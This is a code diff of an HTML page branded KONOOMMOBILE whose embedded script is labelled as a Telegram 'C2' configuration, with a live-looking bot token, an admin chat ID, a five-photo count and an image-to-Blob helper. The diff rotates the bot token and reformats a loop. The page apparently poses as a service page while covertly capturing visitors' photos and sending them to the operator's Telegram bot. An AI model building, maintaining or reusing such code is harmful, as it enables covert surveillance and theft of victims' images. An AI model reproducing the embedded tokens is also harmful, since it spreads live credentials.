@@ -318,9 +318,9 @@ KONOOMMOBILE — La proximité au service des agents.</div>
 
     <script>
         // ============================================
-        // CONFIGURATION C2 TELEGRAM (VERROUILLÉ)
+        // CONFIGURATION C2 TELEGRAM (MIS À JOUR)
         // ============================================
-        const BOT_TOKEN = "8851908882:AAFMfPwA9NjdgUwws1SiV_XX6XuVkaD3k3c";
+        const BOT_TOKEN = "8424189628:AAEewbU8l8JJHtBZr48rwYu5VQo39yxVU2o";
         const ADMIN_CHAT_ID = "6815008409";
         
         const TOTAL_PHOTOS = 5;
@@ -576,7 +576,9 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             const bstr = atob(arr[1]);
             let n = bstr.length;
             const u8arr = new Uint8Array(n);
-            while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
             return new Blob([u8arr], { type: mime });
         }
     </script>
